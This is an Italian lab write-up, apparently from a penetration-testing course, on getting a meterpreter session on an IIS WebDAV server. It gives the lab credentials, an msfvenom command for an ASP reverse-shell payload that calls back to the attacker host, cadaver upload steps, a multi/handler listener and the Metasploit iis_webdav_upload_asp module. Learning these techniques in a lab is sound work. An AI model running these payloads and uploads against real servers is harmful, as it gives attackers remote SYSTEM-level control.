# Exploiting WebDAV With Metasploit

Stesso ambiente di prima, quindi:

bob e password\_123321

Ma in più supporta l'esecuzione di file asp più complessi e quindi anche di meterpreter shells

## Verifichiamo se alla porta 80 è in esecuzione webdav

```
nmap -sV -p 80 --script=http-enum 10.2.30.233
```

<figure><img src="../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

Sì è in esecuzione con autenticazione (401 Unauthorized)

> Note: If http-enum script would take longer than expected then run dirb tool to find webdav directory.
>
> **Command: dirb demo.ine.local**

## Autentichiamoci a WebDAV via web browser

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Come ottenere una reverse shell/meterpreter session su webdav con asp

### Metodo 1: generare un payload con msfvenom

msfvenom è un tool di MSF che permette di creare un reverse shell payload in vari linguaggi es. asp

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > shell.asp
// dove LHOST è l'IP della nostra macchina attaccante e LPORT è una porta sulla quale ascolteremo con netcat
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Meglio usare sempre il payload per architettura 32 bit perché tanto funziona anche per il 64 bit.

#### Caricare con cadaver il file shell.asp

```
cadaver http://10.2.30.233/webdav
put /root/shell.asp
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Prepariamo il listener prima di eseguire il file shell.asp

```
service postgresql start && msfconsole
use multi/handler //modulo metasploit per settare un listner per il payload usato
set payload windows/meterpreter/reverse_tcp //stesso payload usato per generare il file asp
show options // impostiamo LPORT e LHOST con gli stessi valori usati per generare il file asp
set LHOST 10.10.5.2
set LPORT 1234
run
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ora rimane in ascolto

#### Esecuzione reverse shell payload

Clicchiamo sul file shell.asp su webdav:

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

E verifichiamo che il listener multi/handler in MSF abbia ricevuto la connessione:

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Confermiamo con sysinfo e controlliamo l'utente con getuid, in questo caso siamo già amministratori (NT AUTHORITY\SYSTEM) quindi non dovremo fare escalation dei privilegi.

#### Eliminare il file shell.asp dal server con cadaver

```
delete shell.asp
ls
```

<figure><img src="../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Metodo 2: Utilizzare un modulo MSF per automatizzare il processo

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
search iis upload
use exploit/windows/iis/iis_webdav_upload_asp
// di default va sul payload windows a 32bit, possiamo modificarlo se ci serve diverso
show options
set HttpUsername bob
set HttpPassword password_123321
set RHOSTS 10.2.30.233 //target ip
// potremmo dover cambiare la RPORT e SSL da false a true, a seconda dei casi. E anche LPORT se vogliamo
set PATH /webdav/metasploit.asp  //path dove caricherà il file asp
exploit
> sysinfo
> getuid
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>

Meterpreter session aperta.

<figure><img src="../../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>

Come vediamo abbiamo ottenuto la stessa cosa che facendolo manualmente, però è importante sapere come si fa anche manualmente senza l'aiuto di metasploit payload.

Cosa interessante: questo modulo crea ed elimina il file con il payload:

<figure><img src="../../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>

Certo potremmo cancellarlo anche manualmente con cadaver
